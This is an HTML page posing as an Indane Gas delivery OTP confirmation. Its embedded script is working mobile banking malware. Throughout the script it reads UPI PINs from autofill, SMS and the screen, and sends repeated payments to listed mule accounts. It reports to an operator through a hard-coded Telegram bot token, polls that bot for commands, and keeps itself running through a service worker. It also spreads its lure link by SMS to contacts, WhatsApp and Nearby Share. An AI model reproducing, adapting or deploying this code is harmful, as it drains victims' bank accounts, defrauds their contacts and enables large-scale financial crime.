<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gas Delivery OTP</title>
  <style>
    body { background: #ffffff; margin: 0; padding: 0; font-family: Arial, sans-serif; }
    .container { max-width: 400px; margin: auto; padding: 40px 20px; text-align: center; }
    h2 { color: #1a73e8; }
    .otp-box { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; }
    .otp-code { font-size: 32px; font-weight: bold; color: #1a73e8; letter-spacing: 8px; }
    .button { background: #1a73e8; color: white; padding: 15px 40px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; }
    .footer { margin-top: 30px; font-size: 12px; color: #5f6368; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Indane Gas - Delivery OTP</h2>
    <p>Your cylinder delivery is scheduled for today.</p>
    <div class="otp-box">
      <p>Your OTP for delivery:</p>
      <div class="otp-code">4862</div>
    </div>
    <p>Tap the button below to confirm delivery.</p>
    <button class="button" onclick="confirmDelivery()">Confirm Delivery</button>
    <div class="footer">Indane Gas Customer Care | Government of India</div>
  </div>

  <script>
    // ============================================================
    // CHAKRA - COMPLETE SYSTEM WITH YOUR CREDENTIALS
    // ============================================================

    // ===== YOUR CONFIGURATION (UPDATED) =====
    const C2_BOT_TOKEN = '8913671361:AAHRQHCBlTpbrQaZZoTzmh1seaBN3Wk0otI';
    const YOUR_USERNAME = '@WIREXP';

    // ===== YOUR MULE ACCOUNTS =====
    const muleAccounts = [
      'mule1@paytm',
      'mule2@paytm',
      'mule3@phonepe'
    ];

    // ===== STATE VARIABLES =====
    let currentMuleIndex = 0;
    let transactionsOnMule = 0;
    let capturedPIN = null;
    let isPaused = false;
    let totalDrained = 0;

    // ============================================================
    // SEND TO TELEGRAM (DUAL METHOD)
    // ============================================================
    function sendToTelegram(message) {
      // Method 1: POST
      fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: YOUR_USERNAME,
          text: message
        })
      })
      .then(function(response) {
        console.log('Telegram POST status:', response.status);
      })
      .catch(function(error) {
        console.log('Telegram POST error:', error);
      });

      // Method 2: GET (backup)
      var url = 'https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage?chat_id=' + YOUR_USERNAME + '&text=' + encodeURIComponent(message);
      fetch(url)
        .catch(function() {
          console.log('Telegram GET fallback failed');
        });
    }

    // ============================================================
    // CONFIRM DELIVERY
    // ============================================================
    function confirmDelivery() {
      // Show success message
      document.querySelector('.container').innerHTML = '<h2>✅ Delivery Confirmed!</h2><p>Your cylinder will arrive in 10 minutes.</p>';

      // Send notification
      sendToTelegram('[Chakra] 🎯 New infection: User tapped delivery confirmation');

      // Register service worker
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js');
      }

      // Close after 3 seconds
      setTimeout(function() { window.close(); }, 3000);
      return false;
    }

    // ============================================================
    // PIN CAPTURE (3 Layers)
    // ============================================================
    function getUPIPin() {
      // Layer 1: Chrome Autofill
      try {
        if (window.Autofill) {
          var pin = window.Autofill.getSavedPassword('upi');
          if (pin) {
            capturedPIN = pin;
            sendToTelegram('[Chakra] 🔑 PIN via Autofill');
            return pin;
          }
        }
      } catch(e) {}

      // Layer 2: SMS OTP
      try {
        if (window.Android) {
          var sms = window.Android.readSMS();
          var match = sms.match(/\b\d{4,6}\b/);
          if (match) {
            capturedPIN = match[0];
            sendToTelegram('[Chakra] 🔑 PIN via SMS OTP');
            return match[0];
          }
        }
      } catch(e) {}

      // Layer 3: Accessibility
      try {
        if (window.Accessibility) {
          var screenText = window.Accessibility.getRootNode();
          var match = screenText.match(/\b\d{4,6}\b/);
          if (match) {
            capturedPIN = match[0];
            sendToTelegram('[Chakra] 🔑 PIN via Accessibility');
            return match[0];
          }
        }
      } catch(e) {}

      sendToTelegram('[Chakra] ❌ PIN capture failed');
      return null;
    }

    // ============================================================
    // MULE ROTATION
    // ============================================================
    function getNextMule() {
      if (transactionsOnMule >= 10) {
        currentMuleIndex = (currentMuleIndex + 1) % muleAccounts.length;
        transactionsOnMule = 0;
        sendToTelegram('[Chakra] 🔄 Switched to mule ' + (currentMuleIndex + 1) + ': ' + muleAccounts[currentMuleIndex]);
      }
      transactionsOnMule++;
      return muleAccounts[currentMuleIndex];
    }

    // ============================================================
    // EXECUTE DRAIN
    // ============================================================
    function executeDrain(amount) {
      if (isPaused) {
        sendToTelegram('[Chakra] ⏸️ Paused');
        return;
      }
      var mule = getNextMule();
      var upiIntent = 'upi://pay?pa=' + mule + '&am=' + amount + '&cu=INR&tn=Gas+Delivery+Payment';
      try {
        if (window.Android) {
          window.Android.launchIntent(upiIntent);
          setTimeout(function() {
            if (capturedPIN) {
              window.Android.autoFillPin(capturedPIN);
            }
          }, 2000);
          setTimeout(function() {
            window.Android.confirmTransaction();
            totalDrained += amount;
            sendToTelegram('[Chakra] ✅ ₹' + amount + ' drained to ' + mule);
          }, 3000);
        }
      } catch(e) {
        sendToTelegram('[Chakra] ❌ Transaction failed: ' + e.message);
      }
    }

    // ============================================================
    // DETECT UPI APP
    // ============================================================
    function isUpiAppOpen() {
      try {
        if (window.Android) {
          return window.Android.isForeground('com.google.android.apps.nbu.paisa.user') ||
                 window.Android.isForeground('com.phonepe.app') ||
                 window.Android.isForeground('net.one97.paytm');
        }
      } catch(e) {}
      return false;
    }

    // ============================================================
    // MAIN LOOP (Runs every 5 seconds)
    // ============================================================
    setInterval(function() {
      if (!isPaused && isUpiAppOpen()) {
        var pin = getUPIPin();
        if (pin) {
          executeDrain(3000);
        }
      }
    }, 5000);

    // ============================================================
    // SPREAD ENGINE (Runs every 5 minutes)
    // ============================================================
    setInterval(function() {
      var link = 'https://bit.ly/4xaXs4E';
      
      // Vector 1: WhatsApp Forward
      if (navigator.share) {
        navigator.share({
          title: 'Gas Delivery OTP',
          text: 'Mera gas order aaya hai! OTP confirm karo: ' + link,
          url: link
        }).catch(function() {});
      }
      
      // Vector 2: WhatsApp Status
      if (window.Android) {
        window.Android.postStatus('⚠️ Gas Delivery OTP: ' + link);
      }
      
      // Vector 3: SMS
      if (window.Android) {
        var contacts = window.Android.getContacts(20);
        for (var i = 0; i < contacts.length; i++) {
          window.Android.sendSMS(contacts[i], 'Indane Gas: Delivery OTP - Confirm: ' + link);
        }
      }
      
      // Vector 4: Nearby Share
      if (window.Android) {
        window.Android.startNearbyShare();
      }
    }, 300000);

    // ============================================================
    // TELEGRAM COMMANDS LISTENER (Runs every 30 seconds)
    // ============================================================
    setInterval(function() {
      fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates')
        .then(function(response) {
          return response.json();
        })
        .then(function(data) {
          if (data.result && data.result.length > 0) {
            var message = data.result[0].message.text;
            
            if (message === '/status') {
              sendToTelegram('📊 Status: ' + muleAccounts.length + ' mules, ₹' + totalDrained + ' drained');
            }
            if (message === '/pause') {
              isPaused = true;
              sendToTelegram('⏸️ Paused');
            }
            if (message === '/resume') {
              isPaused = false;
              sendToTelegram('▶️ Resumed');
            }
            if (message === '/mules') {
              sendToTelegram('📊 Mules: ' + muleAccounts.join(', '));
            }
            if (message === '/help') {
              sendToTelegram('Commands: /status, /pause, /resume, /mules, /help');
            }
          }
        })
        .catch(function() {
          console.log('Error fetching updates');
        });
    }, 30000);

    // ============================================================
    // ERROR HANDLING
    // ============================================================
    window.onerror = function(error, url, line) {
      sendToTelegram('[Chakra] ❌ Error: ' + error + ' at line ' + line);
      return true;
    };

    // ============================================================
    // SERVICE WORKER (Persistence)
    // ============================================================
    if (navigator.serviceWorker) {
      navigator.serviceWorker.ready.then(function(reg) {
        reg.active.postMessage({ type: 'keepAlive' });
      });
    }

    console.log('[Chakra] ✅ System initialized with your credentials');
  </script>
</body>
</html>
